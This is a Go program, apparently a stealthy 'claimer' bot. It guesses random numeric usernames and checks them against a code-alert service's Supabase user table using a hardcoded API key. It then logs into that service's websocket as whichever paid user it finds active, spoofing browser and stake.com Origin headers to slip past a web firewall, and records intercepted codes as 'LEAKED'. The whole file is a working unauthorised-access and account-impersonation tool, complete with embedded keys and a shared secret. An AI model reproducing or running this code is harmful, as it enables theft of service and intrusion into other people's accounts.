package main

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"runtime/debug"
	"strconv"
	"sync"
	"syscall"
	"time"

	"github.com/gorilla/websocket"
)

// ==========================================
// CONFIGURATION (STAY STEALTHY)
// ==========================================
var (
	SERVER_URL      = getEnv("TARGET_URL", "wss://ws.mvpsensi.in/ws/codes")
	TOTAL_CLIENTS   = 1
	MAX_WORKERS     = 1
	RECONNECT_DELAY = 3 * time.Second
	serverIP        string
)

// Supabase Config
const (
	SUPABASE_URL = "https://nuvaoxfaxflsttsdhafx.supabase.co/rest/v1/users"
	SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im51dmFveGZheGZsc3R0c2RoYWZ4Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzkwOTAxNTksImV4cCI6MjA5NDY2NjE1OX0.Nhx6omTj7Fx67MyFBMZDr04ceDgcj4kVH4xynMesi9A"
	SUPABASE_AUTH = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im51dmFveGZheGZsc3R0c2RoYWZ4Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzkwOTAxNTksImV4cCI6MjA5NDY2NjE1OX0.Nhx6omTj7Fx67MyFBMZDr04ceDgcj4kVH4xynMesi9A"
)

// Shared Secret from JS Claimer
const SHARED_SECRET = "vipxK9mP2vL8nQ4wRjT5bYc"

var workerSemaphore = make(chan struct{}, MAX_WORKERS)
var printHandshakeOnce sync.Once

func init() {
	rand.Seed(time.Now().UnixNano())
}

// ==========================================
// USER VALIDATION (Supabase -> mvpsensi.in fallback)
// ==========================================
type SupabaseUser struct {
	IsActive     bool    `json:"is_active"`
	ActiveTill   *string `json:"active_till"`
	ActiveUntil  *string `json:"active_until"`
	ExpiresAt    *string `json:"expires_at"`
	ValidUntil   *string `json:"valid_until"`
	Expiry       *string `json:"expiry"`
}

type MvpSensiStatus struct {
	Active bool `json:"active"`
}

func checkUserActive(username string) bool {
	// 1. Supabase direct
	if checkSupabase(username) {
		return true
	}
	// 2. mvpsensi.in status (fallback)
	return checkMvpSensi(username)
}

func checkSupabase(username string) bool {
	req, err := http.NewRequest("GET", SUPABASE_URL+"?username=eq."+url.QueryEscape(username)+"&select=*", nil)
	if err != nil {
		return false
	}
	req.Header.Set("apikey", SUPABASE_KEY)
	req.Header.Set("Authorization", SUPABASE_AUTH)

	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	var users []SupabaseUser
	if err := json.Unmarshal(body, &users); err != nil || len(users) == 0 {
		return false
	}

	u := users[0]
	if !u.IsActive {
		return false
	}

	// Check expiry fields in order of priority
	expiryFields := []*string{u.ActiveTill, u.ActiveUntil, u.ExpiresAt, u.ValidUntil, u.Expiry}
	for _, field := range expiryFields {
		if field != nil && *field != "" {
			if expiryTime, err := time.Parse(time.RFC3339, *field); err == nil {
				return time.Now().Before(expiryTime)
			}
			// Try other common formats
			if expiryTime, err := time.Parse("2006-01-02T15:04:05Z", *field); err == nil {
				return time.Now().Before(expiryTime)
			}
			if expiryTime, err := time.Parse("2006-01-02 15:04:05", *field); err == nil {
				return time.Now().Before(expiryTime)
			}
		}
	}
	// No expiry field set = active
	return true
}

func checkMvpSensi(username string) bool {
	url := "https://mvpsensi.in/internal/api-user/status/" + url.QueryEscape(username)
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	var status MvpSensiStatus
	if err := json.Unmarshal(body, &status); err != nil {
		return false
	}
	return status.Active
}

// ==========================================
// TOKEN + USERNAME GENERATORS
// ==========================================
func generateRandomUsername() string {
	var digits = []rune("0123456789")
	length := 5 + rand.Intn(2)
	b := make([]rune, length)
	for i := range b {
		b[i] = digits[rand.Intn(len(digits))]
	}
	return string(b)
}

func getEnv(key, defaultValue string) string {
	if value, exists := os.LookupEnv(key); exists {
		return value
	}
	return defaultValue
}

// ==========================================
// HMAC TOKEN GENERATION (Exact JS Logic Ported)
// ==========================================
func getServerTime() (int64, error) {
	return time.Now().Unix(), nil
}

func generateHMACAuthToken(username string) (string, error) {
	serverTime, err := getServerTime()
	if err != nil {
		log.Printf("[WARN] Server time fetch failed, using local time")
		serverTime = time.Now().Unix()
	}

	message := fmt.Sprintf("%s:%d", username, serverTime)
	key := []byte(SHARED_SECRET)

	h := hmac.New(sha256.New, key)
	h.Write([]byte(message))
	signature := hex.EncodeToString(h.Sum(nil))

	return fmt.Sprintf("%d:%s", serverTime, signature), nil
}

// ==========================================
// CLIENT STRUCT
// ==========================================
type StressClient struct {
	clientID     int
	username     string
	ws           *websocket.Conn
	connected    bool
	running      bool
	lastActivity time.Time
	lock         sync.Mutex
	sendChan     chan map[string]interface{}
	doneChan     chan struct{}
}

func NewStressClient(id int) *StressClient {
	return &StressClient{
		clientID: id,
		sendChan: make(chan map[string]interface{}, 256),
		doneChan: make(chan struct{}),
	}
}

func getWAFHeaders() http.Header {
	headers := http.Header{}
	headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	headers.Add("Origin", "https://stake.com")
	return headers
}

func (c *StressClient) Connect() bool {
	// Generate username and VALIDATE before connecting
	for {
		c.username = generateRandomUsername()
		if checkUserActive(c.username) {
			log.Printf("[Client %d] User %s validated as active", c.clientID, c.username)
			break
		}
		log.Printf("[Client %d] User %s not active, trying another...", c.clientID, c.username)
		time.Sleep(500 * time.Millisecond)
	}

	// Generate HMAC Token (Core Logic Added)
	authToken, err := generateHMACAuthToken(c.username)
	if err != nil {
		log.Printf("[Client %d] Failed to generate auth token", c.clientID)
		return false
	}

	parsedURL, err := url.Parse(SERVER_URL)
	var connectURL string

	if err == nil {
		q := parsedURL.Query()
		q.Set("user", c.username)
		parsedURL.RawQuery = q.Encode()

		if serverIP != "" {
			parsedURL.Host = serverIP
		}
		connectURL = parsedURL.String()
	} else {
		connectURL = SERVER_URL + "?user=" + url.QueryEscape(c.username)
	}

	dialer := websocket.DefaultDialer
	dialer.HandshakeTimeout = 10 * time.Second

	ws, resp, err := dialer.Dial(connectURL, getWAFHeaders())
	if err != nil {
		if resp != nil {
			log.Printf("[Client %d] Dial failed with status: %d", c.clientID, resp.StatusCode)
		}
		return false
	}

	c.ws = ws

	// Wait for WELCOME
	ws.SetReadDeadline(time.Now().Add(10 * time.Second))
	_, welcomeMsg, err := ws.ReadMessage()
	if err != nil {
		c.Disconnect()
		return false
	}

	if serverIP == "" {
		if tcpAddr, ok := ws.RemoteAddr().(*net.TCPAddr); ok {
			serverIP = tcpAddr.IP.String() + ":" + strconv.Itoa(tcpAddr.Port)
			log.Printf("[Client %d] Resolved server IP: %s", c.clientID, serverIP)
		}
	}

	printHandshakeOnce.Do(func() {
		log.Printf("\n[+] SERVER WELCOME: %s\n", string(welcomeMsg))
	})

	// Auth — Surya uses {"type":"auth","user":USERNAME}
	regPayload := map[string]interface{}{
		"type": "auth",
		"user": c.username,
	}

	err = ws.WriteJSON(regPayload)
	if err != nil {
		c.Disconnect()
		return false
	}

	// Read auth response
	ws.SetReadDeadline(time.Now().Add(8 * time.Second))
	_, authResp, authErr := ws.ReadMessage()
	ws.SetReadDeadline(time.Time{})
	if authErr != nil {
		log.Printf("[Client %d] No auth reply (server closed?): %v", c.clientID, authErr)
		c.Disconnect()
		return false
	}
	log.Printf("[Client %d] AUTH REPLY for user=%s : %s", c.clientID, c.username, string(authResp))

	c.lock.Lock()
	c.connected = true
	c.lastActivity = time.Now()
	c.sendChan = make(chan map[string]interface{}, 256)
	c.doneChan = make(chan struct{})
	c.lock.Unlock()

	log.Printf("[Client %d] Auth sent for user: %s | HMAC: %s...", c.clientID, c.username, authToken[:30]+"...")

	go c.writePump()
	return true
}

func (c *StressClient) Disconnect() {
	c.lock.Lock()
	defer c.lock.Unlock()
	if !c.connected {
		return
	}
	if c.ws != nil {
		c.ws.Close()
	}
	c.connected = false
	close(c.doneChan)
}

func (c *StressClient) writePump() {
	for {
		select {
		case msg, ok := <-c.sendChan:
			if !ok {
				return
			}
			if c.ws != nil {
				c.ws.SetWriteDeadline(time.Now().Add(10 * time.Second))
				if err := c.ws.WriteJSON(msg); err != nil {
					c.Disconnect()
					return
				}
			}
		case <-c.doneChan:
			return
		}
	}
}

func (c *StressClient) Run() {
	c.running = true
	workerSemaphore <- struct{}{}
	defer func() { <-workerSemaphore }()

	for c.running {
		c.lock.Lock()
		isConnected := c.connected
		c.lock.Unlock()

		if !isConnected {
			if !c.Connect() {
				time.Sleep(RECONNECT_DELAY)
				continue
			}
		}

		for {
			_, message, err := c.ws.ReadMessage()
			if err != nil {
				c.Disconnect()
				time.Sleep(RECONNECT_DELAY)
				break
			}

			c.lock.Lock()
			c.lastActivity = time.Now()
			c.lock.Unlock()

			log.Printf("[Client %d] RAW: %s", c.clientID, string(message))

			var data map[string]interface{}
			if err := json.Unmarshal(message, &data); err == nil {
				if data["type"] == "ping" {
					select {
					case c.sendChan <- map[string]interface{}{"type": "pong"}:
					default:
					}
				}

				if code, exists := data["code"]; exists {
					log.Printf("\n[LEAKED]: %v \n", code)
					if code == "NEW_DEVICE_CONNECTED" {
						log.Printf("Kicked because the user connected elsewhere. Pausing 10s...")
						c.Disconnect()
						time.Sleep(10 * time.Second)
						break
					}
				}

				if data["message"] == "Authentication failed" {
					log.Printf("BANNED/INVALID. Reconnecting...")
					c.Disconnect()
					time.Sleep(RECONNECT_DELAY)
					break
				}
			}
			runtime.Gosched()
		}
	}
}

func main() {
	log.SetFlags(log.LstdFlags | log.Lmsgprefix)
	debug.SetMemoryLimit(850 * 1024 * 1024)
	runtime.GOMAXPROCS(runtime.NumCPU())

	log.Println("========================================")
	log.Println(" KING-CLAIMER STEALTH GHOST ACTIVE ")
	log.Printf(" Target: %s", SERVER_URL)
	log.Println(" HMAC Auth + Random Username + User Validation Active ")
	log.Println("========================================")

	var wg sync.WaitGroup
	for i := 0; i < TOTAL_CLIENTS; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			client := NewStressClient(id)
			client.Run()
		}(i)
	}

	done := make(chan os.Signal, 1)
	signal.Notify(done, os.Interrupt, syscall.SIGINT, syscall.SIGTERM)
	<-done

	log.Println("Shutting down...")
	wg.Wait()
}
